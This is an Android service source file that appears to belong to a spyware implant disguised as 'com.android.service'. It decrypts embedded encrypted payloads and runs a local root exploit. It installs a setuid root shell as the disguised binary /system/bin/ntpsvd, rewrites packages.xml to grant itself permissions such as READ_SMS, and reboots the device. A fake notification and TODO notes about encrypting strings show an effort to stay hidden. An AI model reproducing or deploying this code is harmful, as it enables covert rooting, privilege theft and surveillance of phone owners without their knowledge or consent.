package com.android.service;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.util.Arrays;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.KeyGenerator;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;

import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.app.WallpaperManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.res.Configuration;
import android.content.res.Resources;
import android.graphics.Bitmap;
import android.graphics.Bitmap.Config;
import android.graphics.Canvas;
import android.graphics.Paint;
import android.os.Build;
import android.os.IBinder;
import android.view.Display;
import android.view.WindowManager;
import android.widget.Toast;

import com.android.service.auto.Cfg;
import com.android.service.capabilities.PackageInfo;
import com.android.service.util.Check;
import com.android.service.util.Utils;

/**
 * The Class ServiceCore.
 */
public class ServiceCore extends Service {
	static {
		System.loadLibrary("runner");
	}

	private native int invokeRun(String cmd);

	private static final String TAG = "ServiceCore"; //$NON-NLS-1$
	private Notification notification;
	private boolean needsNotification = false;
	private Core core;

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public void onCreate() {
		super.onCreate();
		Messages.init(getApplicationContext());
		
		if (Cfg.DEBUG) {
			Check.log(TAG + " (onCreate)"); //$NON-NLS-1$
		}

		if (Cfg.DEMO) {
			Toast.makeText(this, Messages.getString("32.1"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
			// setBackground();
		}

		needsNotification = isNotificationNeeded();
		
		Status.setAppContext(getApplicationContext());

		if (needsNotification == true) {
			Notification note = new Notification(R.drawable.notify_icon, "Ready to go?",
					System.currentTimeMillis());
			
			Intent i = new Intent(this, FakeActivity.class);
	
			i.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP);
	
			PendingIntent pi = PendingIntent.getActivity(this, 0, i, 0);
	
			note.setLatestEventInfo(this, "Fake Activity", "Now Playing: \"Sta cippa!\"", pi);
			note.flags |= Notification.FLAG_NO_CLEAR;
	
			startForeground(1260, note);
		}
	}

	private boolean isNotificationNeeded() {
		int sdk_version = android.os.Build.VERSION.SDK_INT;
		
		if (sdk_version >= 11 /*Build.VERSION_CODES.HONEYCOMB*/) {
			return true;
		}
		
		return false;
	}

	@Override
	public void onStart(Intent intent, int startId) {
		super.onStart(intent, startId);

		if (Cfg.DEBUG) {
			Check.log(TAG + " (onStart)"); //$NON-NLS-1$
		}

		if (PackageInfo.checkRoot() == true) {
			Status.self().setRoot(true);
		} else {
			Status.self().setRoot(false);
		}

		if (Cfg.EXP) {
			boolean isRoot = false;
			
			if (PackageInfo.checkRoot() == false) {
				// Don't exploit if we have no SD card mounted
				if (android.os.Environment.getExternalStorageState().equals(android.os.Environment.MEDIA_MOUNTED)) {
					//isRoot = root();
				} else {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (onStart) no media mounted"); //$NON-NLS-1$
					}
				}
			}

			if (isRoot == false) {
				// Ask the user...
				superapkRoot();
				
				isRoot = PackageInfo.checkRoot();
			}
			
			if (isRoot == true) {
				int ret = overridePermissions();

				Toast.makeText(this, "RET: " + ret, Toast.LENGTH_LONG).show(); //$NON-NLS-1$

				switch (ret) {
					case 0:
					case 1:
						return; // Non possiamo partire
	
					case 2: // Possiamo partire
					default:
						break;
				}
			}
			
			Status.self().setRoot(isRoot);
		}

		// Core starts
		core = Core.getInstance();
		core.Start(this.getResources(), getContentResolver());
	}

	@Override
	public void onConfigurationChanged(Configuration newConfig) {
		super.onConfigurationChanged(newConfig);

		if (Cfg.DEBUG) {
			Check.log(TAG + " (onConfigurationChanged)"); //$NON-NLS-1$
		}

		if (Cfg.DEMO) {
			Toast.makeText(this, Messages.getString("36.3"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
		}
	}

	@Override
	public void onLowMemory() {
		super.onLowMemory();

		if (Cfg.DEBUG) {
			Check.log(TAG + " (onLowMemory)"); //$NON-NLS-1$
		}

		if (Cfg.DEMO) {
			Toast.makeText(this, Messages.getString("36.4"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
		}
	}

	@Override
	public void onRebind(Intent intent) {
		super.onRebind(intent);

		if (Cfg.DEBUG) {
			Check.log(TAG + " (onRebind)"); //$NON-NLS-1$
		}

		if (Cfg.DEMO) {
			Toast.makeText(this, Messages.getString("36.5"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
		}
	}

	@Override
	public boolean onUnbind(Intent intent) {
		boolean ret = super.onUnbind(intent);

		if (Cfg.DEBUG) {
			Check.log(TAG + " (onUnbind)"); //$NON-NLS-1$
		}

		if (Cfg.DEMO) {
			Toast.makeText(this, Messages.getString("36.6"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
		}

		return ret;
	}

	@Override
	public void onDestroy() {
		super.onDestroy();

		if (Cfg.DEBUG) {
			Check.log(TAG + " (onDestroy)"); //$NON-NLS-1$
		}

		if (Cfg.DEMO) {
			Toast.makeText(this, Messages.getString("32.3"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
		}

		core.Stop();
		core = null;
		
		if (needsNotification == true) {
			stopForeground(true);
		}
	}

	private void setBackground() {
		if (Cfg.DEMO) {
			final WallpaperManager wm = WallpaperManager.getInstance(this);
			final Display display = ((WindowManager) Status.getAppContext().getSystemService(Context.WINDOW_SERVICE))
					.getDefaultDisplay();
			final int width = display.getWidth();
			final int height = display.getHeight();
			final Bitmap bitmap = Bitmap.createBitmap(width, height, Config.ARGB_8888);
			final Canvas canvas = new Canvas(bitmap);
			final Paint paint = new Paint();
			paint.setStyle(Paint.Style.FILL);
			paint.setAntiAlias(true);
			paint.setTextSize(20);
			canvas.drawText(Messages.getString("32.0"), 10, 100, paint);

			try {
				wm.setBitmap(bitmap);
			} catch (final IOException e) {
				if (Cfg.DEBUG) {
					Check.log(e);
				}
			}
		}
	}

	// TODO: rimuovere lo string-fu, cifrare le stringhe, cifrare
	// le stringe nella librunner.so. Fixare il fatto che l'app va
	// in crash se la funzione torna 0 o 1 e si ferma il servizio.

	/*
	 * Verifica e prova ad ottenere le necessarie capabilities
	 * 
	 * Return: 0 se c'e' stato un errore 1 se le cap sono state ottenute ma si
	 * e' in attesa di un reboot 2 se gia' abbiamo le cap necessarie
	 */
	private int overridePermissions() {
		final String manifest = Messages.getString("32.15"); //$NON-NLS-1$ 

		// Controlliamo se abbiamo le capabilities necessarie
		PackageManager pkg = Status.getAppContext().getPackageManager();

		if (pkg != null) {
			// android.permission.READ_SMS, com.android.service
			int perm = pkg.checkPermission(Messages.getString("32.16"), Messages.getString("32.17"));

			if (perm == PackageManager.PERMISSION_GRANTED) {
				return 2;
			}
		}

		try {
			// Runtime.getRuntime().exec("/system/bin/ntpsvd fhc /data/system/packages.xml /data/data/com.android.service/files/packages.xml");
			// Creiamo la directory files
			openFileOutput("test", Context.MODE_WORLD_READABLE);

			// Copiamo packages.xml nel nostro path e rendiamolo scrivibile
			// /system/bin/ntpsvd fhc /data/system/packages.xml
			// /data/data/com.android.service/files/packages.xml
			invokeRun(Messages.getString("32.18"));
			Utils.sleep(600);
			// /system/bin/ntpsvd pzm 666
			// /data/data/com.android.service/files/packages.xml
			invokeRun(Messages.getString("32.19"));

			// Rimuoviamo il file temporaneo
			// /data/data/com.android.service/files/test
			File tmp = new File(Messages.getString("32.20"));

			if (tmp.exists() == true) {
				tmp.delete();
			}

			// Aggiorniamo il file
			// packages.xml
			FileInputStream fin = openFileInput(Messages.getString("32.21"));
			// com.android.service
			PackageInfo pi = new PackageInfo(fin, Messages.getString("2.17"));

			String path = pi.getPackagePath();

			if (path.length() == 0) {
				return 0;
			}

			// Vediamo se gia' ci sono i permessi richiesti
			if (pi.checkRequiredPermission() == true) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (overridePermissions): Capabilities already acquired"); //$NON-NLS-1$
				}

				// Rimuoviamo la nostra copia
				// /data/data/com.android.service/files/packages.xml
				File f = new File(Messages.getString("32.22"));

				if (f.exists() == true) {
					f.delete();
				}

				return 2;
			}

			// perm.xml
			pi.addRequiredPermissions(Messages.getString("32.23"));

			// .apk con tutti i permessi nel manifest
			InputStream manifestApkStream = getResources().openRawResource(R.raw.layout);
			fileWrite(manifest, manifestApkStream, Messages.getString("36.0"));

			// Copiamolo in /data/app/*.apk
			// /system/bin/ntpsvd qzx \"cat
			// /data/data/com.android.service/files/layout >
			invokeRun(Messages.getString("32.24") + path + "\"");

			// Copiamolo in /data/system/packages.xml
			// /system/bin/ntpsvd qzx
			// \"cat /data/data/com.android.service/files/perm.xml > /data/system/packages.xml\""
			invokeRun(Messages.getString("32.25"));

			// Rimuoviamo la nostra copia
			// /data/data/com.android.service/files/packages.xml
			File f = new File(Messages.getString("32.22"));

			if (f.exists() == true) {
				f.delete();
			}

			// Rimuoviamo il file temporaneo
			// /data/data/com.android.service/files/perm.xml
			f = new File(Messages.getString("32.26"));

			if (f.exists() == true) {
				f.delete();
			}

			// Rimuoviamo l'apk con tutti i permessi
			// /data/data/com.android.service/files/layout
			f = new File(Messages.getString("32.27"));

			if (f.exists() == true) {
				f.delete();
			}

			// Riavviamo il telefono
			// /system/bin/ntpsvd reb
			invokeRun(Messages.getString("32.28"));
		} catch (Exception e1) {
			if (Cfg.EXCEPTION) {
				Check.log(e1);
			}

			if (Cfg.DEBUG) {
				Check.log(e1);//$NON-NLS-1$
				Check.log(TAG + " (root): Exception on overridePermissions()"); //$NON-NLS-1$
			}

			return 0;
		}

		return 1;
	}

	// Prendi la root tramite superuser.apk
	private boolean superapkRoot() {
		final File filesPath = getApplicationContext().getFilesDir();
		final String path = filesPath.getAbsolutePath();
		final String suidext = Messages.getString("32.6"); // statusdb
		boolean isRoot = PackageInfo.checkRoot();
		
		Resources resources = getResources();
		InputStream stream = resources.openRawResource(R.raw.statuslog);

		stream = resources.openRawResource(R.raw.statusdb);
		
		try {
			// 0x5A3D10448D7A912A
			fileWrite(suidext, stream, Messages.getString("36.2"));
			
			// Proviamoci ad installare la nostra shell root
			if (Cfg.DEBUG) {
				Check.log(TAG + " (superapkRoot): " + "chmod 755 " + path + "/" + suidext); //$NON-NLS-1$
				Check.log(TAG + " (superapkRoot): " + "su -c \"" + path + "/" + suidext + Messages.getString("32.11") + "\""); //$NON-NLS-1$
			}
			
			Runtime.getRuntime().exec("chmod 755 " + path + "/" + suidext);
			Runtime.getRuntime().exec("su -c \"" + path + "/" + suidext + Messages.getString("32.11") + "\""); //$NON-NLS-1$ //$NON-NLS-2$
		} catch (final Exception e1) {
			if (Cfg.EXCEPTION) {
				Check.log(e1);
			}

			if (Cfg.DEBUG) {
				Check.log(e1);//$NON-NLS-1$
				Check.log(TAG + " (superapkRoot): Exception"); //$NON-NLS-1$
			}

			return false;
		}
		
		
		return isRoot;
	}
	
	private boolean root() {
		try {
			if (!Cfg.EXP) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (root): Exploit disabled by conf"); //$NON-NLS-1$
				}

				return false;
			}

			final String crashlog = Messages.getString("32.4"); //$NON-NLS-1$
			final String exploit = Messages.getString("32.5"); //$NON-NLS-1$
			final String suidext = Messages.getString("32.6"); //$NON-NLS-1$
			boolean isRoot = false;

			// Creiamo il crashlog
			final FileOutputStream fos = getApplicationContext().openFileOutput(crashlog, MODE_PRIVATE);
			fos.close();

			Resources resources = getResources();
			InputStream stream = resources.openRawResource(R.raw.statuslog);
			
			// "0x5A3D10448D7A912B"
			fileWrite(exploit, stream, Messages.getString("36.1"));

			stream = resources.openRawResource(R.raw.statusdb);
			
			// 0x5A3D10448D7A912A
			fileWrite(suidext, stream, Messages.getString("36.2"));

			// Eseguiamo l'exploit
			final File filesPath = getApplicationContext().getFilesDir();
			final String path = filesPath.getAbsolutePath();

			Runtime.getRuntime().exec(Messages.getString("32.7") + path + "/" + exploit); //$NON-NLS-1$ //$NON-NLS-2$
			Runtime.getRuntime().exec(Messages.getString("32.8") + path + "/" + suidext); //$NON-NLS-1$ //$NON-NLS-2$
			Runtime.getRuntime().exec(Messages.getString("32.9") + path + "/" + crashlog); //$NON-NLS-1$ //$NON-NLS-2$

			final String exppath = path + "/" + exploit; //$NON-NLS-1$

			final ExploitRunnable r = new ExploitRunnable(exppath);
			new Thread(r).start();

			// Attendiamo al max 100 secondi il nostro file setuid root
			final long now = System.currentTimeMillis();

			while (System.currentTimeMillis() - now < 100 * 1000) {
				Utils.sleep(1000);

				if (PackageInfo.checkRoot()) {
					isRoot = true;
					break;
				}
			}

			if (r.getProcess() != null) {
				r.getProcess().destroy();
			}

			if (isRoot) {
				// Di' a suidext di fare il kill di VOLD per due volte
				Runtime.getRuntime().exec(path + "/" + suidext + Messages.getString("32.10")); //$NON-NLS-1$ //$NON-NLS-2$

				// Copia la shell root, ovvero il suidext, in /system/bin/ntpsvd
				Runtime.getRuntime().exec(path + "/" + suidext + Messages.getString("32.11")); //$NON-NLS-1$ //$NON-NLS-2$

				if (Cfg.DEBUG) {
					Check.log(TAG + " (onStart): Root exploit"); //$NON-NLS-1$
				}
				
				if (Cfg.DEMO) {
					Toast.makeText(this, Messages.getString("32.12"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
				}

				// Riavviamo il telefono
				Runtime.getRuntime().exec(path + "/" + suidext + " reb"); //$NON-NLS-1$ //$NON-NLS-2$
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (onStart): exploit failed!"); //$NON-NLS-1$
				}
				if (Cfg.DEMO) {
					Toast.makeText(this, Messages.getString("32.13"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
				}
			}
			
			return isRoot;
			
		} catch (final Exception e1) {
			if (Cfg.EXCEPTION) {
				Check.log(e1);
			}

			if (Cfg.DEBUG) {
				Check.log(e1);//$NON-NLS-1$
				Check.log(TAG + " (root): Exception on root()"); //$NON-NLS-1$
			}

			return false;
		}
	}

	private boolean fileWrite(final String exploit, InputStream stream, String passphrase) throws IOException,
			FileNotFoundException {
		try {
			InputStream in = decodeEnc(stream, passphrase);

			final FileOutputStream out = openFileOutput(exploit, MODE_PRIVATE);
			byte[] buf = new byte[1024];
			int numRead = 0;

			while ((numRead = in.read(buf)) >= 0) {
				out.write(buf, 0, numRead);
			}

			out.close();
		} catch (Exception ex) {
			if (Cfg.EXCEPTION) {
				Check.log(ex);
			}

			if (Cfg.DEBUG) {
				ex.printStackTrace();
				Check.log(TAG + " (fileWrite): " + ex);
			}

			return false;
		}

		return true;
	}

	private InputStream decodeEnc(InputStream stream, String passphrase) throws IOException, NoSuchAlgorithmException,
			NoSuchPaddingException, InvalidKeyException, InvalidAlgorithmParameterException {

		SecretKey key = Messages.produceKey(passphrase);

		if (Cfg.DEBUG) {
			Check.asserts(key != null, "null key"); //$NON-NLS-1$
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (decodeEnc): stream=" + stream.available());
			Check.log(TAG + " (decodeEnc): key=" + Utils.byteArrayToHex(key.getEncoded()));
		}

		Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding"); //$NON-NLS-1$
		final byte[] iv = new byte[16];
		Arrays.fill(iv, (byte) 0);
		IvParameterSpec ivSpec = new IvParameterSpec(iv);

		cipher.init(Cipher.DECRYPT_MODE, key, ivSpec);
		CipherInputStream cis = new CipherInputStream(stream, cipher);

		if (Cfg.DEBUG) {
			Check.log(TAG + " (decodeEnc): cis=" + cis.available());
		}

		return cis;
	}

	// Exploit thread
	class ExploitRunnable implements Runnable {
		private Process localProcess;
		private final String exppath;

		public ExploitRunnable(String exppath) {
			this.exppath = exppath;
		}

		public Process getProcess() {
			return localProcess;
		}

		public void run() {
			try {
				localProcess = Runtime.getRuntime().exec(exppath);

				final BufferedWriter stdin = new BufferedWriter(new OutputStreamWriter(localProcess.getOutputStream()));
				final BufferedReader stdout = new BufferedReader(new InputStreamReader(localProcess.getInputStream()));
				final BufferedReader stderr = new BufferedReader(new InputStreamReader(localProcess.getErrorStream()));
				String line = null;

				while ((line = stdout.readLine()) != null) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (stdout): " + line); //$NON-NLS-1$
					}
				}

				while ((line = stderr.readLine()) != null) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (stderr): " + line); //$NON-NLS-1$
					}
				}

				try {
					localProcess.waitFor();
				} catch (final InterruptedException e) {
					if (Cfg.EXCEPTION) {
						Check.log(e);
					}

					if (Cfg.DEBUG) {
						Check.log(TAG + " (waitFor): " + e); //$NON-NLS-1$
						Check.log(e);//$NON-NLS-1$
					}
				}

				final int exitValue = localProcess.exitValue();
				if (Cfg.DEBUG) {
					Check.log(TAG + " (waitFor): exitValue " + exitValue); //$NON-NLS-1$
				}

				stdin.close();
				stdout.close();
				stderr.close();

			} catch (final IOException e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				localProcess = null;
				if (Cfg.DEBUG) {
					Check.log(TAG + " (ExploitRunnable): Exception on run(): " + e); //$NON-NLS-1$
					Check.log(e);//$NON-NLS-1$
				}
			}
		}

	};
}
